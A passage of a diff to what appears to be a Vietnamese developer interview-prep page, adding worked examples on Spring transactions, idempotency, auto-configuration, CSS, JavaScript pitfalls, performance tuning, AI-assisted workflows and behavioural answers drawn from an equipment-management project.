+  public Object logTime(ProceedingJoinPoint pjp) throws Throwable {
+    long start = System.currentTimeMillis();
+    try {
+      return pjp.proceed();                       // chạy method gốc
+    } finally {
+      log.info("{} chạy {}ms", pjp.getSignature().toShortString(),
+          System.currentTimeMillis() - start);
+    }
+  }
+}</code></pre>
             </div>
           </details>
 
@@ -1967,6 +2608,22 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
               </ul>
               <div class="callout warn"><strong>Self-invocation:</strong> gọi method <code>@Transactional</code> từ chính class đó không đi qua proxy → annotation không có tác dụng. Tách sang bean khác hoặc dùng AspectJ/TransactionTemplate.</div>
               <p><strong>Distributed transaction:</strong> 2PC/XA nặng và ít dùng; thực tế dùng Saga, outbox pattern, idempotency, eventual consistency.</p>
+              <p><strong>Ví dụ SEIXX — import CSV phải all-or-nothing:</strong></p>
+              <pre><code>@Service
+public class CsvImportService {
+
+  @Transactional(rollbackFor = Exception.class)   // lỗi bất kỳ → rollback cả lô
+  public ImportResult importEquipments(MultipartFile file) {
+    List&lt;CsvRow&gt; rows = parser.parse(file);
+    validator.validateAll(rows);        // ném CsvValidationException nếu có dòng sai
+    repo.batchInsert(rows);             // ghi 10k dòng trong cùng transaction
+    audit.log("IMPORT", rows.size());   // ghi audit chung transaction
+    return new ImportResult(rows.size());
+  }
+
+  // Self-invocation: gọi importEquipments() từ method khác trong class này
+  // sẽ KHÔNG mở transaction — phải gọi qua bean khác hoặc TransactionTemplate.
+}</code></pre>
             </div>
           </details>
 
@@ -1988,6 +2645,71 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 <li><strong>Reconciliation:</strong> truy vấn theo requestId trả cùng kết quả; retry an toàn; đối soát cuối ngày.</li>
               </ul>
               <div class="callout tip"><strong>Trả lời phỏng vấn:</strong> “Em sẽ dùng idempotency key + unique constraint ở DB, kết hợp Redis lock và transaction/row lock; UI chỉ hỗ trợ giảm thao tác, không phải lớp bảo vệ chính.”</div>
+              <pre><code>-- Tầng DB chốt cuối: request_id unique — request thứ 2 vi phạm constraint
+CREATE TABLE transfer (
+  id           BIGSERIAL PRIMARY KEY,
+  request_id   UUID NOT NULL,
+  amount       NUMERIC(15,2) NOT NULL,
+  status       VARCHAR(20) NOT NULL,
+  CONSTRAINT uq_transfer_request UNIQUE (request_id)
+);
+
+-- Redis chống trùng sớm trước khi vào DB
+SET transfer:req:{requestId} 1 NX EX 300   -- OK = chưa xử lý; nil = đang xử lý
+
+-- Nếu muốn trả cùng kết quả cho request lặp (idempotent response):
+SELECT status, amount FROM transfer WHERE request_id = :requestId;
+-- có dòng → trả lại kết quả cũ, KHÔNG trừ tiền lần 2</code></pre>
+            </div>
+          </details>
+
+          <details class="qa" id="q-be-autoconfig">
+            <summary>
+              <span class="q-index">30</span>
+              <span class="q-text">Cơ chế auto-configuration trong Spring Boot hoạt động như thế nào?</span>
+              <span class="q-tag blue">Spring</span>
+              <span class="chevron" aria-hidden="true"></span>
+            </summary>
+            <div class="answer">
+              <p><code>@SpringBootApplication</code> = <code>@SpringBootConfiguration</code> + <code>@ComponentScan</code> + <code>@EnableAutoConfiguration</code>. Phần "auto" nằm ở <code>@EnableAutoConfiguration</code>.</p>
+              <p><strong>Cơ chế (4 bước):</strong></p>
+              <ol>
+                <li><code>@EnableAutoConfiguration</code> import <code>AutoConfigurationImportSelector</code>.</li>
+                <li>Selector đọc danh sách cấu hình ứng viên từ classpath: Spring Boot 3 dùng file <code>META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports</code> (trước 2.7 là <code>spring.factories</code>).</li>
+                <li>Mỗi auto-config là một class <code>@AutoConfiguration</code> gắn điều kiện <code>@Conditional</code>: <code>@ConditionalOnClass</code> (class có trong classpath?), <code>@ConditionalOnMissingBean</code> (chưa có bean nào?), <code>@ConditionalOnProperty</code>, <code>@ConditionalOnWebApplication</code>...</li>
+                <li>Điều kiện đúng → các <code>@Bean</code> bên trong mới được đăng ký vào context; sai → bỏ qua hoàn toàn, không lỗi.</li>
+              </ol>
+              <pre><code>// Ví dụ thật: mybatis-spring-boot-starter có trong classpath
+// → MybatisAutoConfiguration tự tạo SqlSessionFactory, SqlSessionTemplate
+// → chỉ cần khai báo trong application.yml:
+mybatis:
+  mapper-locations: classpath:mapper/*.xml
+  configuration:
+    map-underscore-to-camel-case: true
+
+// Không có MyBatis trong classpath → toàn bộ cấu hình này tự bị bỏ qua
+
+// Xem auto-config nào đã áp dụng / bị bỏ (ConditionEvaluationReport):
+debug: true</code></pre>
+              <ul>
+                <li><strong>Ghi đè:</strong> tự định nghĩa bean cùng loại → <code>@ConditionalOnMissingBean</code> thấy bean của mình nên auto-config nhường quyền.</li>
+                <li><strong>Loại bỏ:</strong> <code>@SpringBootApplication(exclude = DataSourceAutoConfiguration.class)</code> khi không muốn dùng DB.</li>
+                <li><strong>Tự viết starter:</strong> class <code>@AutoConfiguration</code> + <code>@ConditionalOnClass</code>, khai báo vào file <code>AutoConfiguration.imports</code> của module.</li>
+              </ul>
+              <pre><code>@AutoConfiguration
+@ConditionalOnClass(CsvImporter.class)
+public class CsvImportAutoConfiguration {
+
+  @Bean
+  @ConditionalOnMissingBean
+  CsvImporter csvImporter(CsvImportProperties props) {
+    return new CsvImporter(props.getBatchSize());   // mặc định 500
+  }
+}
+
+// META-INF/spring/org.springframework.boot.autoconfigure.AutoConfiguration.imports
+// com.seixx.csv.CsvImportAutoConfiguration</code></pre>
+              <p><strong>Ở SEIXX:</strong> nhờ starter mà không phải viết XML bean cho SqlSessionFactory; khi cần ObjectMapper riêng cho import CSV, em tạo <code>@Bean</code> của mình — auto-config của Jackson tự nhường; batch size để trong <code>application.yml</code> (<code>seixx.import.batch-size: 500</code>) thay vì hard-code.</p>
             </div>
           </details>
         </div>
@@ -2073,6 +2795,16 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 <li><strong>Padding:</strong> khoảng cách <em>bên trong</em> giữa border và content; làm tăng kích thước nếu <code>box-sizing: content-box</code>; không nhận giá trị âm.</li>
                 <li><strong>Mẹo nhớ:</strong> margin là “khoảng thở giữa các hộp”, padding là “đệm bên trong hộp”.</li>
               </ul>
+              <pre><code>/* SEIXX: card thiết bị trong danh sách */
+.equipment-card {
+  padding: 16px;         /* chữ không dính viền card */
+  margin-bottom: 12px;   /* tách card này với card dưới */
+  border: 1px solid #ddd;
+  border-radius: 8px;
+}
+/* margin âm để kéo card lên đè nhẹ (hiếm dùng, cẩn thận)
+   margin collapse: 2 card margin-bottom 12 + margin-top 12
+   → khoảng cách thực tế chỉ 12px, không phải 24px */</code></pre>
             </div>
           </details>
 
@@ -2089,6 +2821,15 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 <li><code>border-box</code>: <code>width/height</code> bao gồm cả padding và border; content tự co lại. Dễ tính layout, đặc biệt khi dùng phần trăm.</li>
                 <li>Thường reset toàn bộ: <code>*, *::before, *::after { box-sizing: border-box; }</code>.</li>
               </ul>
+              <pre><code>/* content-box (mặc định): width 300 + padding 20*2 + border 2*2 = 344px thực tế */
+.card { width: 300px; padding: 20px; border: 2px solid; }
+
+/* border-box: width là 300px TRỌN VẸN — content tự co còn 256px */
+* { box-sizing: border-box; }
+.card { width: 300px; padding: 20px; border: 2px solid; }
+
+/* Layout % dễ vỡ nếu content-box: 3 cột 33.33% + padding → tràn hàng
+   → border-box là lý do gần như mọi dự án reset về border-box */</code></pre>
             </div>
           </details>
 
@@ -2104,6 +2845,15 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
               <p><strong>Box:</strong> <code>margin</code>, <code>padding</code>, <code>border</code>, <code>border-radius</code>, <code>box-shadow</code>, <code>box-sizing</code>.</p>
               <p><strong>Text/visual:</strong> <code>color</code>, <code>background</code>, <code>font-family</code>, <code>font-size</code>, <code>font-weight</code>, <code>line-height</code>, <code>text-align</code>, <code>text-overflow</code>, <code>opacity</code>.</p>
               <p><strong>Hiệu ứng:</strong> <code>transition</code>, <code>transform</code>, <code>animation</code>, <code>cursor</code>. Nên hạn chế animate layout properties; ưu tiên <code>transform</code>/<code>opacity</code>.</p>
+              <p><strong>Ở SEIXX — badge trạng thái thiết bị:</strong> áp dụng vài thuộc tính hay dùng cùng lúc:</p>
+              <pre><code>.status-badge {
+  display: inline-flex; align-items: center; gap: 6px;
+  padding: 2px 10px; border-radius: 999px;      /* viên thuốc */
+  font-size: 12px; font-weight: 600;
+  transition: opacity .15s ease;                 /* animate opacity, không animate width */
+}
+.status-badge.running   { background: #dcfce7; color: #166534; }
+.status-badge.stopped   { background: #fee2e2; color: #991b1b; }</code></pre>
             </div>
           </details>
 
@@ -2123,6 +2873,18 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 <li><code>sticky</code>: bình thường theo luồng, dính khi cuộn tới ngưỡng (cần top/bottom).</li>
                 <li><code>z-index</code> chỉ có tác dụng khi phần tử tạo stacking context và position khác static (hoặc flex/grid item).</li>
               </ul>
+              <p><strong>Ở SEIXX:</strong> 2 tình huống hay dùng nhất — dropdown menu và header dính khi cuộn bảng dài:</p>
+              <pre><code>/* Dropdown: cha relative, menu con absolute */
+.equipment-menu { position: relative; }
+.equipment-menu .dropdown {
+  position: absolute; top: 100%; right: 0; z-index: 20;
+}
+
+/* Header bảng dính khi cuộn danh sách 10.000 dòng */
+.equipment-table thead th {
+  position: sticky; top: 0; z-index: 10;
+  background: white;   /* bắt buộc, nếu không thấy chữ hàng dưới chui qua */
+}</code></pre>
             </div>
           </details>
 
@@ -2148,6 +2910,13 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 <li>Kế thừa (inheritance) không phải specificity; property inherited chỉ áp dụng nếu không có rule trực tiếp.</li>
                 <li>Nên dùng class, tránh ID cho styling và tránh nesting quá sâu.</li>
               </ul>
+              <pre><code>/* Giả sử muốn đổi màu nút, nhưng nút không đổi → có rule mạnh hơn đang thắng */
+button.btn { ... }                          /* 0-1-1 */
+#import-panel .btn { ... }                  /* 1-1-0  ← mạnh hơn vì có ID */
+.btn { color: red !important; }             /* thắng tất cả (trừ inline !important) */
+
+/* Tính nhanh: (inline, ID, class/attr/pseudo, element)
+   .table tbody tr:hover td  → (0, 0, 1+1, 3) = 0-2-3 */</code></pre>
             </div>
           </details>
 
@@ -2170,6 +2939,7 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 </table>
               </div>
               <p>Cả ba đều còn trong DOM (trừ khi bị remove bằng JS). <code>display: none</code> khiến screen reader bỏ qua; nếu cần ẩn khỏi thị giác nhưng vẫn cho screen reader, dùng kỹ thuật “visually hidden” (clip/position) thay vì display none.</p>
+              <p><strong>Ở SEIXX:</strong> modal import hiển thị phụ thuộc trạng thái nên dùng <code>v-if</code> (display none, không render, không tab được); loading overlay dùng <code>visibility</code> để giữ layout không nhảy; tooltip dùng <code>opacity</code> + transition cho mượt nhưng nhớ <code>pointer-events: none</code> nếu không muốn chặn thao tác.</p>
             </div>
           </details>
 
@@ -2224,6 +2994,18 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 </table>
               </div>
               <p>TypeScript là superset của JavaScript: mọi code JS hợp lệ đều là TS hợp lệ (về cú pháp), nhưng TS bổ sung kiểm tra kiểu trước khi chạy.</p>
+              <pre><code>// TS bắt lỗi ngay khi gõ: API trả về equipment_code, mình gõ nhầm
+interface EquipmentDto {
+  equipmentCode: string;
+  status: 'RUNNING' | 'STOPPED' | 'MAINTENANCE';
+}
+
+const e: EquipmentDto = await fetchEquipment(id);
+console.log(e.equipment_code);   // ❌ TS báo lỗi ngay trong editor
+console.log(e.equipmentCode);    // ✓
+
+// JS thuần: lỗi chỉ lộ ra lúc chạy — undefined, không ai báo
+console.log(e.equipment_code);   // undefined (im lặng, bug lọt lên production)</code></pre>
             </div>
           </details>
 
@@ -2248,6 +3030,22 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 </table>
               </div>
               <p><code>const</code> không làm object immutable; chỉ không cho gán lại reference. Nội dung object/array vẫn có thể thay đổi. Ưu tiên <code>const</code>, dùng <code>let</code> khi cần gán lại; tránh <code>var</code>.</p>
+              <pre><code>// Bug kinh điển với var trong vòng lặp (var không có block scope)
+for (var i = 0; i &lt; 3; i++) {
+  setTimeout(() =&gt; console.log(i));   // in ra 3, 3, 3 — không phải 0, 1, 2
+}
+for (let j = 0; j &lt; 3; j++) {
+  setTimeout(() =&gt; console.log(j));   // in ra 0, 1, 2 — đúng
+}
+
+// const với object: không gán lại được, nhưng sửa nội dung vẫn OK
+const filter = { status: 'RUNNING' };
+filter.status = 'STOPPED';    // OK
+// filter = {};                // ❌ TypeError
+
+// Nên: mảng danh sách không đổi reference
+const equipments = [];
+equipments.push(item);        // OK — const không cấm mutate</code></pre>
             </div>
           </details>
 
@@ -2265,6 +3063,17 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 <li>Nên dùng <code>===</code> để tránh hành vi bất ngờ; ngoại lệ có thể là kiểm tra <code>value == null</code> để bắt cả null/undefined nếu thật sự muốn.</li>
                 <li><code>NaN === NaN</code> là false; dùng <code>Number.isNaN()</code>. <code>Object.is</code> xử lý một số case đặc biệt.</li>
               </ul>
+              <pre><code>'5' == 5            // true  ← ép kiểu ngầm
+'5' === 5           // false ← khác kiểu
+0 == ''             // true  ← bẫy!
+null == undefined   // true
+[] == false         // true  ← bẫy!
+NaN === NaN         // false
+
+// Bug thật: kiểm tra mã thiết bị từ form input (luôn là string)
+const code = form.value;        // "0"
+if (code == 0) { ... }          // true — vào nhầm nhánh!
+if (code === '') { ... }        // đúng: kiểm tra rỗng phải so với chuỗi</code></pre>
             </div>
           </details>
 
@@ -2310,6 +3119,19 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 <li>Server nhanh, SSR/SSG nếu phù hợp; cache; giảm TTFB.</li>
                 <li>Tránh layout shift và font chậm: <code>font-display: swap</code>, preload font.</li>
               </ul>
+              <p><strong>Ví dụ đo và sửa:</strong> màn hình dashboard SEIXX có LCP = 4.2s (kém) — DevTools Performance chỉ ra phần tử LCP là ảnh biểu đồ 2MB không nén. Sửa 3 bước, đo lại sau mỗi bước:</p>
+              <pre><code>&lt;!-- Trước --&gt;
+&lt;img src="/chart-full-2mb.png"&gt;
+
+&lt;!-- Sau: đúng kích thước + WebP + preload (ảnh above-the-fold) --&gt;
+&lt;link rel="preload" as="image" href="/chart.avif"
+      imagesrcset="/chart.avif 1x, /chart@2x.avif 2x"&gt;
+&lt;img src="/chart.avif" width="800" height="400" alt="Sản lượng tuần"&gt;
+&lt;!-- width/height chống layout shift --&gt;
+
+&lt;!-- Ảnh dưới màn hình mới lazy-load --&gt;
+&lt;img src="/detail.png" loading="lazy"&gt;</code></pre>
+              <p>Kết quả: 4.2s → 1.6s (đạt mốc tốt ≤ 2.5s); bước tiếp theo là defer bundle JS không cần cho màn đầu.</p>
             </div>
           </details>
 
@@ -2329,6 +3151,7 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 <li>Trả lời kèm nguồn; đánh giá retrieval và faithfulness.</li>
               </ol>
               <p><strong>Lợi ích:</strong> giảm hallucination, dùng dữ liệu nội bộ, cập nhật không cần train lại. <strong>Thách thức:</strong> chất lượng chunk/embedding, truy xuất sai, context quá dài, bảo mật dữ liệu.</p>
+              <p><strong>Ứng dụng thực tế em dùng:</strong> tài liệu dự án SEIXX (spec, enum trạng thái, format file CSV của khách) được chunk theo mục rồi nhúng vào knowledge base — khi AI trả lời sai tên cột hay sai encoding, em đối chiếu lại với chunk gốc để sửa context thay vì “dạy lại” bằng prompt dài. Với câu hỏi kỹ thuật không có trong tài liệu nội bộ thì RAG trả “không tìm thấy” — tránh bịa.</p>
             </div>
           </details>
 
@@ -2348,6 +3171,13 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 <li>Nếu rối: <code>git rebase --abort</code>/<code>git merge --abort</code> và trao đổi với người cùng sửa.</li>
               </ol>
               <p>Phòng tránh: pull thường xuyên, chia task nhỏ, commit sớm, tránh sửa cùng file lớn, thống nhất format code.</p>
+              <p><strong>Ví dụ thực tế:</strong> hai người cùng sửa <code>EquipmentMapper.xml</code> — conflict trông như sau:</p>
+              <pre><code>&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEAD (nhánh của mình)
+  AND status = #{status}
+=======
+  AND e.status = #{status}   -- (nhánh bạn: đổi alias bảng)
+&gt;&gt;&gt;&gt;&gt;&gt;&gt; feature/equipment-alias</code></pre>
+              <p>Không chọn thô một bên — hiểu ý cả hai: nhánh bạn đổi alias nên giữ <code>e.status</code>, phần của mình vẫn đúng logic. Sửa xong chạy test trước khi <code>git add</code>; nếu bí thì mở PR hỏi trực tiếp người cùng sửa thay vì đoán.</p>
             </div>
           </details>
 
@@ -2365,6 +3195,7 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 <li><strong>Kanban:</strong> luồng công việc liên tục, giới hạn WIP, kéo task qua cột; phù hợp support/vận hành, thay đổi liên tục.</li>
                 <li><strong>Chọn:</strong> Scrum khi cần nhịp sprint và planning; Kanban khi công việc đến liên tục và cần tối ưu flow.</li>
               </ul>
+              <p><strong>Ở SEIXX:</strong> dùng Jira theo Scrum — sprint 2 tuần; task chia nhỏ (task “API tìm kiếm thiết bị” tách từ story “Quản lý danh mục thiết bị”); hằng ngày cập nhật trạng thái task, cuối sprint demo cho khách Nhật và ghi nhận bug vào backlog sprint sau. Bug production thì tạo task riêng gắn vào sprint đang chạy nếu gấp, không chờ sprint sau.</p>
             </div>
           </details>
 
@@ -2384,6 +3215,14 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
                 <li>Kiểm tra trên mobile/tablet/desktop, dark mode, trạng thái loading/empty/error.</li>
               </ol>
               <p><strong>Khi nào dùng AI:</strong> tạo nhanh boilerplate, gợi ý layout, đổi CSS; <strong>khi nào code tay:</strong> logic phức tạp, design system, hiệu năng, accessibility và các chi tiết cần kiểm soát.</p>
+              <p><strong>Ví dụ prompt thực tế dùng cho dashboard SEIXX:</strong></p>
+              <pre><code>“Tạo skeleton Vue 3 + SCSS cho màn danh sách thiết bị:
+- Toolbar: ô search, dropdown trạng thái, nút Import CSV
+- Bảng: mã, nhà máy, trạng thái (badge màu), ngày cập nhật, action
+- Responsive: desktop bảng đầy đủ, mobile chuyển card
+- Dùng Grid cho khung trang, Flex cho toolbar
+Không dùng thư viện UI ngoài, giữ class theo convention BEM.”</code></pre>
+              <p>Sau khi AI generate: em tự sửa spacing theo design system, thêm trạng thái loading/empty/error, kiểm tra badge không phụ thuộc màu (thêm icon + text cho accessibility), và test breakpoint mobile thật thay vì tin ngay.</p>
             </div>
           </details>
         </div>
@@ -2421,6 +3260,13 @@ PaymentService payment; // chọn cash, không dùng primary</code></pre>
               <p><strong>Tuy nhiên em luôn review lại:</strong> business logic, security, performance, transaction, exception handling và coding convention trước khi đưa vào project.</p>
               <p><strong>Cách đo hiệu quả:</strong> so sánh thời gian hoàn thành task, số bug/review comment, thời gian viết test và mức độ phải sửa lại. Không nên chỉ nói “nhanh hơn” mà cần số liệu thực tế.</p>
               <div class="callout tip"><strong>Mẫu trả lời:</strong> “Trước đây em mất khoảng X giờ cho một màn hình; khi dùng AI để phân tích DD, generate skeleton và test case, thời gian giảm còn Y giờ. Em vẫn tự review phần nghiệp vụ và security, nên chất lượng không giảm; số lỗi phát hiện ở review cũng ít hơn nhờ checklist rõ ràng.” Hãy thay X/Y bằng số liệu thật của bạn.</div>
+              <p><strong>Ví dụ việc thật đã dùng AI ở SEIXX:</strong></p>
+              <ul>
+                <li>Đọc file DD tiếng Nhật → nhờ AI tóm tắt thành checklist validate từng cột CSV (vẫn tự đối chiếu lại DD gốc).</li>
+                <li>Generate skeleton Controller/Service/Mapper cho màn hình mới, sau đó tự sửa theo convention dự án (tên method, format response, exception).</li>
+                <li>Nhờ AI viết Unit Test cho validator CSV: file rỗng, thiếu cột, ngày sai format, trùng mã — tự chạy và bổ sung case thiếu.</li>
+                <li>Nhờ AI review câu SQL trước khi gửi leader: gợi ý index, cảnh báo hàm trên cột index; tự chạy EXPLAIN để xác nhận.</li>
+              </ul>
             </div>
           </details>
 
@@ -2477,6 +3323,27 @@ Spring Boot 3 + PostgreSQL + MyBatis. Layered: Controller -&gt; Service -&gt; Re
                 <li><strong>Loại 2 — Tool/API skill:</strong> cách gọi API, dùng CLI, đọc log, query DB. Ít sáng tạo, chủ yếu là thao tác chính xác theo quy trình.</li>
               </ul>
               <p>Cấu trúc gợi ý cho một skill: <code>name</code>, <code>description</code>, <code>inputs</code>, <code>workflow</code>, <code>rules</code>, <code>output</code>, <code>done when</code>.</p>
+              <p><strong>Ví dụ skill ngắn (loại creative coding):</strong></p>
+              <pre><code>---
+name: write-unit-test
+description: Viết Unit Test cho service layer theo convention dự án (JUnit 5 + Mockito).
+---
+# Inputs
+- Class cần test + method public quan trọng
+- Convention test hiện có (đọc 1 file test mẫu trước)
+
+# Workflow
+1. Đọc class + method cần test, liệt kê nhánh logic và edge case.
+2. Viết test: happy path, boundary, exception, null/empty.
+3. Chạy test; test fail thì báo rõ input nào fail, không tự sửa source code.
+
+# Rules
+- Mock repository/external, không gọi DB thật.
+- Không assert yếu kiểu assertNotNull nếu có thể assert giá trị.
+- Không đổi production code khi đang viết test.
+
+# Done when
+- Tất cả test pass; coverage các nhánh chính; tên test mô tả đúng hành vi.</code></pre>
             </div>
           </details>
 
@@ -2568,6 +3435,29 @@ description: Implement a safe CSV import feature in Spring Boot.
                 <li><strong>Workflow:</strong> các bước bắt buộc, điểm dừng, output format.</li>
               </ol>
               <div class="callout info"><strong>Ví dụ prompt đơn giản:</strong> “Dựa vào <code>claude.md</code> và <code>rules/testing.md</code>, dùng skill <code>csv-import</code> để implement chức năng import sinh viên. Trả về diff, danh sách file đã sửa và test đã chạy.”</div>
+              <p><strong>Ví dụ khi nào lên agent:</strong> chuẩn bị release màn hình import — cần nhiều việc nối tiếp nhau. Thay vì ngồi prompt từng việc, định nghĩa agent <code>release-checker</code>:</p>
+              <pre><code># Role
+Bạn là release-checker cho module import CSV của SEIXX.
+
+# Goal
+Kiểm tra module trước khi merge: build, test, review rule, tổng hợp báo cáo.
+
+# Memory
+- claude.md (convention)
+- rules/security.md, rules/testing.md
+
+# Skills
+- csv-import, write-unit-test
+
+# Workflow (bắt buộc theo thứ tự)
+1. Chạy ./gradlew test — fail thì dừng, báo lỗi.
+2. Soát checklist: bind SQL (#{}), transaction, log không PII, giới hạn file.
+3. Liệt kê file thay đổi kèm rủi ro.
+4. Xuất báo cáo markdown: PASS/FAIL, bằng chứng, việc cần làm.
+
+# Rules
+- Không tự sửa code production; chỉ báo cáo.
+- Dừng ngay nếu có secret trong diff.</code></pre>
             </div>
           </details>
 
@@ -2589,6 +3479,25 @@ description: Implement a safe CSV import feature in Spring Boot.
                 <li><strong>Compact:</strong> thực hiện khi 70–80% hoặc kết thúc một feature; giữ lại quyết định, constraint, file đã sửa, TODO, lỗi đang gặp.</li>
                 <li><strong>Plan mode:</strong> dùng cho task lớn: AI chỉ đọc/phân tích và lập kế hoạch trước khi sửa, giảm rủi ro.</li>
               </ul>
+              <p><strong>Ví dụ bản compact sau khi làm xong chức năng import CSV (giữ lại đúng thứ cần):</strong></p>
+              <pre><code>## Quyết định
+- Import theo batch 500, @Transactional ở CsvImportService.
+- Lỗi partial: gom theo dòng, KHÔNG rollback toàn bộ.
+- Detect encoding UTF-8/Shift-JIS trước khi parse.
+
+## Constraint
+- Không log giá trị PII; log line number + reason.
+- Bind param MyBatis (#{}), không nối chuỗi SQL.
+
+## File đã sửa
+- EquipmentController.java (endpoint POST /api/equipments/import)
+- CsvImportService.java (mới)
+- EquipmentMapper.xml (batch insert)
+
+## TODO / Lỗi đang gặp
+- [ ] Bổ sung test file Shift-JIS
+- [ ] Đo lại thời gian import 10.000 dòng sau khi thêm index</code></pre>
+              <p>Thay vì giữ cả lịch sử chat dài, bản này đủ để mở session mới và tiếp tục công việc.</p>
             </div>
           </details>
 
@@ -2609,6 +3518,13 @@ description: Implement a safe CSV import feature in Spring Boot.
                 <li><strong>Chia sẻ:</strong> viết lesson learned, cập nhật skill/rule sau mỗi sprint.</li>
               </ol>
               <p><strong>Plan mode</strong> phù hợp khi task phức tạp, nhiều file, thay đổi kiến trúc hoặc chưa rõ requirement. AI sẽ khảo sát code, đề xuất kế hoạch và chờ duyệt trước khi chỉnh sửa — giảm việc sửa sai lan rộng.</p>
+              <p><strong>Ví dụ lộ trình pilot cụ thể (tham khảo, thay số thật):</strong></p>
+              <ul>
+                <li><strong>Tuần 1–2 (pilot):</strong> chỉ dùng AI viết Unit Test + tài liệu cho 1 màn hình nhỏ; đo thời gian viết test trước/sau (VD 3 giờ → 1,5 giờ) và số test case tăng thêm.</li>
+                <li><strong>Tuần 3–4 (chuẩn hóa):</strong> viết <code>claude.md</code> theo mẫu Overview/Build/Conventions/Do Not; tạo 2–3 skill đầu tiên (csv-import, write-unit-test); team review chung 1 buổi.</li>
+                <li><strong>Tháng 2 (mở rộng):</strong> dùng Plan mode cho feature import mới; tách agent release-checker; mọi output AI đều qua human review trước khi merge.</li>
+                <li><strong>Đo lường:</strong> thời gian hoàn thành màn hình, số bug phát hiện ở UTR/review, tỉ lệ test tự động; cập nhật skill sau mỗi sprint dựa trên lỗi lặp lại.</li>
+              </ul>
             </div>
           </details>
         </div>
@@ -2622,7 +3538,7 @@ description: Implement a safe CSV import feature in Spring Boot.
             <p>Trọng tâm khi phỏng vấn VNPT, MB Bank, FPT và cách kể câu chuyện của bạn.</p>
           </div>
           <div class="section-actions">
-            <span class="qa-count">6 câu hỏi</span>
+            <span class="qa-count">7 câu hỏi</span>
             <button class="mini-btn" type="button" data-toggle-section="company">Mở tất cả</button>
           </div>
         </div>
@@ -2808,6 +3724,16 @@ Thêm hoặc sửa chức năng import CSV cho một màn hình (equipment, part
                 <li><strong>Result:</strong> hoàn thành đúng hạn, giảm lỗi ở vòng test, tài liệu UTC/UTR đầy đủ; rút ra checklist để lần sau làm nhanh hơn.</li>
               </ul>
               <div class="callout tip"><strong>Mẹo:</strong> đừng kể “khó vì công nghệ mới” mà không nói cách học. Nhà tuyển dụng quan tâm cách bạn xử lý vấn đề và giao tiếp hơn là bản thân lỗi.</div>
+              <p><strong>Ví dụ kể hoàn chỉnh (thay số/chi tiết thật của bạn):</strong></p>
+              <pre><code>S: Màn hình import CSV đã xong theo DD, nhưng khi khách test bằng file
+   thật từ nhà máy thì một số dòng dữ liệu cũ bị sai mã nhà máy, làm
+   import dừng giữa chừng và khó biết dòng nào lỗi.
+T: Cần sửa trước buổi demo, không được làm ảnh hưởng các chức năng khác.
+A: Em đọc lại DD, liệt kê 3 điểm mơ hồ và hỏi BA; đổi sang cơ chế gom lỗi
+   theo dòng (line number + lý do), thêm validate mã master một lần bằng
+   Set; viết test case cho đúng file gây lỗi; log bug Jira và thông báo TL.
+R: Demo đúng hạn; user sửa file theo báo cáo lỗi và import lại thành công;
+   từ đó em làm checklist validate cho các màn hình import sau.</code></pre>
             </div>
           </details>
 
@@ -2827,6 +3753,17 @@ Thêm hoặc sửa chức năng import CSV cho một màn hình (equipment, part
                 <li>Nếu bị hỏi current salary quá sớm, có thể hỏi lại range của vị trí trước; không nói sai số liệu.</li>
                 <li>Điền số thật của bạn vào chỗ trống; không dùng con số minh họa mà không kiểm tra thị trường.</li>
               </ul>
+              <p><strong>Ví dụ đoạn hội thoại:</strong></p>
+              <pre><code>HR: Em đang nhận mức lương bao nhiêu?
+Bạn: Em đang ở mức hiện tại [X]. Khi chuyển môi trường em mong muốn
+khoảng [Y–Z] tùy phạm vi công việc và phúc lợi, nhưng em sẵn sàng
+trao đổi để hai bên phù hợp. Anh/chị có thể chia sẻ range của vị trí
+này để em nắm được bức tranh chung không?
+
+HR: Vì sao em nghĩ mình xứng đáng mức đó?
+Bạn: Em có ~2 năm với 2 dự án Nhật, trong đó dự án hiện tại em làm
+Spring Boot + MyBatis + SQL trực tiếp theo DD, tự viết UTC/UTR, và
+dùng AI có kiểm soát để tăng tốc — điều này phù hợp với mô tả công việc.</code></pre>
             </div>
           </details>
 
@@ -2848,6 +3785,50 @@ Thêm hoặc sửa chức năng import CSV cho một màn hình (equipment, part
                 <li>Điều gì đang là thách thức lớn nhất của team hiện tại?</li>
               </ul>
               <p>Tránh hỏi ngay về lương/OT ở câu đầu; có thể hỏi sau khi đã trao đổi về công việc.</p>
+              <p><strong>Câu trả lời mẫu (nói tự nhiên, 30 giây):</strong></p>
+              <pre><code>“Em kỳ vọng được tham gia một team có quy trình rõ ràng — review code,
+test trước khi release — và được tiếp tục đào sâu Java Backend, đặc biệt
+là database và thiết kế API. Em đã làm theo DD và tự viết UTC/UTR ở dự án
+hiện tại, nên em tin mình hòa nhập được và muốn gắn bó lâu dài.”
+
+Câu hỏi cho nhà tuyển dụng (chọn 2–3, đừng hỏi dồn):
+1. Tech stack và kiến trúc hiện tại của team đang dùng gì ạ?
+2. Quy trình review code và testing của team diễn ra thế nào?
+3. Lộ trình phát triển cho Java Developer trong 1–2 năm đầu?
+4. Thách thức lớn nhất của team hiện tại là gì ạ?</code></pre>
+            </div>
+          </details>
+
+          <details class="qa" id="q-hr-estimate">
+            <summary>
+              <span class="q-index">07</span>
+              <span class="q-text">Khi nhận task, em estimate như thế nào? Cho ví dụ một lần estimate?</span>
+              <span class="q-tag gray">Behavior</span>
+              <span class="chevron" aria-hidden="true"></span>
+            </summary>
+            <div class="answer">
+              <p><strong>Cách estimate của em (theo bước):</strong></p>
+              <ol>
+                <li><strong>Đọc kỹ requirement/DD trước khi nói con số</strong> — liệt kê điểm mơ hồ để hỏi BA/TL; không estimate trên đầu đề chưa rõ.</li>
